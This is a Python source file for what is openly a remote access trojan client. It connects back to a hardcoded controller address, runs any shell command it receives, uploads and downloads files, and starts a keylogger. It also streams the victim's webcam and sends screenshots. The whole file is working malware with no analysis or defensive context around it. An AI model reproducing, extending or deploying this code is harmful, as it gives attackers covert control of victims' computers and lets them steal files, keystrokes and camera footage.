import socket
import subprocess
from subprocess import PIPE
import json
import os
from klog import KL
import threading
import cv2
import pickle
import struct
import pyautogui


sc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sc.connect(('192.168.1.16', 5555))

def accepted():
	data = ''
	while True:
		try:
			data = data + sc.recv(1024).decode().rstrip()
			return json.loads(data)
		except ValueError:
			continue

def ulf(fname):
	file = open(fname, 'rb')
	sc.send(file.read())
	file.close

def dlf(fname):
	file = open(fname, 'wb')
	sc.settimeout(1)
	_file = sc.recv(1024)
	while _file:
		file.write(_file)
		try:
			_file = sc.recv(1024)
		except socket.timeout as e:
			break
	sc.settimeout(None)
	file.close()

def open_log():
	sc.send(KL().r_log().encode())

def log_thread():
	t = threading.Thread(target=open_log)
	t.start()

def byte_stream():
	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	sock.connect(('192.168.1.16', 9999))
	vid = cv2.VideoCapture(0)
	while (vid.isOpened()):
		img, frame = vid.read()
		b = pickle.dumps(frame)
		message = struct.pack("Q", len(b))+b
		sock.sendall(message)

def send_byte_stream():
	t = threading.Thread(target=byte_stream)
	t.start()

def do_command():
	while True:
		command = accepted()
		if command in ('exit', 'out'):
			break
		elif command == 'wipe':
			pass
		elif command[:3] == 'cd ':
			os.chdir(command[3:])
		elif command[:2] == 'dl':
			ulf(command[3:])
		elif command[:2] == 'ul':
			dlf(command[3:])
		elif command == 'sl':
			KL().s_logger()
		elif command == 'rl':
			log_thread()
		elif command == 'stl':
			KL().st_listen()
		elif command == 'wcam':
			send_byte_stream()
		elif command == 'sh':
			ss = pyautogui.screenshot()
			ss.save('ss.png')
			ulf('ss.png')
		else:
			execute = subprocess.Popen(
									command,
									shell = True,
									stdout = PIPE,
									stderr = PIPE,
									stdin = PIPE
							)
			data = execute.stdout.read() + execute.stderr.read()
			data = data.decode()
			output = json.dumps(data)
			sc.send(output.encode())

do_command()
